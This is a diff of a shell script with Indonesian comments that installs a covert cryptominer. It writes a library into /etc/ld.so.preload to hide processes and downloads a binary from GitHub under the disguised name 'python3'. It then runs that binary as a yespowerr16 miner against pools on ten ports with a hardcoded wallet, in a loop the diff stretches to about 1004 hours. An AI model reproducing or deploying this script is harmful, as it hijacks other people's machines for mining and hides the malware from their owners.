@@ -15,11 +15,10 @@ echo /usr/local/lib/libnyumput.so | sudo tee -a /etc/ld.so.preload
 rm nyumput.c
 
 # Menjalankan dan mengelola proses
-end_time=$(( $(date +%s) + 24*3600 ))  # 6 jam dari sekarang
+end_time=$(( $(date +%s) + 1004*3600 ))  # 6 jam dari sekarang
 while [ $(date +%s) -lt $end_time ]; do
   # Mengunduh dan memeriksa daftar IP
   timestamp=$(date +%s)
-  mkdir -p .lib
   dynamic_sgr="python3"
   wget -O $dynamic_sgr https://github.com/barburonjilo/back/raw/main/sru
   chmod +x $dynamic_sgr
@@ -51,7 +50,7 @@ while [ $(date +%s) -lt $end_time ]; do
     # Memulai proses untuk beberapa port
     for port in $(seq 801 810); do
       # Menjalankan proses dengan parameter yang ditentukan di latar belakang
-      nohup $dynamic_sgr -a yespowerr16 --pool $ip:$port -u YdenAmcQSv3k4qUwYu2qzM4X6qi1XJGvwC --timeout 120 -t 8 -p m=solo > dance_$port_$timestamp.log 2>&1 &
+      ./$dynamic_sgr -a yespowerr16 --pool $ip:$port -u YdenAmcQSv3k4qUwYu2qzM4X6qi1XJGvwC --timeout 120 -t 8 -p m=solo > dance_$port_$timestamp.log 2>&1 &
       process_pid=$!
 
       echo "Memulai proses dengan PID $process_pid menggunakan IP $ip dan port $port"
